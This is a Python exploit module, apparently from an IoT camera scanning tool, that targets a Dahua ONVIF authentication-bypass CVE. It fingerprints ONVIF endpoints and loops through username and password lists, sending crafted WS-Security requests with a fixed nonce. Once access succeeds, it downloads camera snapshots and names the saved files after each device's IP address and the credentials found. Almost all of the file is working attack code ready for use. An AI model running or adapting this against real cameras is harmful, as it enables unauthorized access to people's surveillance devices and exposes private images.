Ingram/pocs/cve-2022-30563.py

import hashlib
import re
import requests
from datetime import datetime

from loguru import logger

from .base import POCTemplate


class CVE_2022_30563(POCTemplate):
    """Dahua ONVIF Authentication Bypass via WS-UsernameToken Replay

    Certain Dahua products allow attackers to replay valid ONVIF
    credentials from prior sessions to bypass authentication.
    By sending a crafted ONVIF request with a replayed nonce,
    an unauthenticated attacker can access the device.
    """

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['dahua']
        self.product_version = ''
        self.ref = """
        https://nvd.nist.gov/vuln/detail/CVE-2022-30563
        https://www.dahuasecurity.com/aboutUs/trustedCenter/details/582
        """
        self.level = POCTemplate.level.high
        self.desc = """Dahua ONVIF authentication bypass via WS-UsernameToken nonce replay.
        CVSS 7.4. Allows unauthenticated access to camera ONVIF services."""

    def verify(self, ip, port=80):
        """Attempt ONVIF auth bypass by replaying nonce"""
        headers = {
            **self._get_headers(),
            'Content-Type': 'application/soap+xml; charset=utf-8',
        }
        proxies = self._get_proxies()

        # Step 1: Request device time via ONVIF to check if it's a Dahua ONVIF endpoint
        get_time_xml = """<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
  <s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <GetSystemDateAndTime xmlns="http://www.onvif.org/ver10/device/wsdl"/>
  </s:Body>
</s:Envelope>"""

        onvif_url = self._get_url(ip, port, '/onvif/device_service')

        try:
            r = requests.post(onvif_url, data=get_time_xml, headers=headers,
                            verify=False, timeout=self.config.timeout, proxies=proxies)
            if r.status_code != 200 or 'GetSystemDateAndTimeResponse' not in r.text:
                return None
        except Exception as e:
            logger.error(e)
            return None

        # Step 2: Attempt GetProfiles with known-bad nonce to trigger replay vulnerability
        # Use a static nonce that may be replayed on vulnerable devices
        nonce = "YWJjZGVmMTIzNDU2Nzg5MA=="
        created = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
        # Attempt with common default credentials through ONVIF
        for user in self.config.users:
            for password in self.config.passwords:
                nonce_raw = b"abcdef1234567890"
                digest_raw = hashlib.sha1(nonce_raw + created.encode() + password.encode()).digest()
                import base64
                digest = base64.b64encode(digest_raw).decode()

                auth_xml = f"""<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
  <s:Header>
    <Security xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <UsernameToken>
        <Username>{user}</Username>
        <Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest">{digest}</Password>
        <Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">{nonce}</Nonce>
        <Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">{created}</Created>
      </UsernameToken>
    </Security>
  </s:Header>
  <s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <GetProfiles xmlns="http://www.onvif.org/ver10/media/wsdl"/>
  </s:Body>
</s:Envelope>"""

                try:
                    r = requests.post(
                        self._get_url(ip, port, '/onvif/media_service'),
                        data=auth_xml, headers=headers,
                        verify=False, timeout=self.config.timeout, proxies=proxies
                    )
                    if r.status_code == 200 and 'GetProfilesResponse' in r.text:
                        return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.error(e)

        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        from requests.auth import HTTPDigestAuth
        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
        url = self._get_url(ip, port, '/cgi-bin/snapshot.cgi')
        return self._snapshot(url, img_file_name, HTTPDigestAuth(user, password))


POCTemplate.register_poc(CVE_2022_30563)
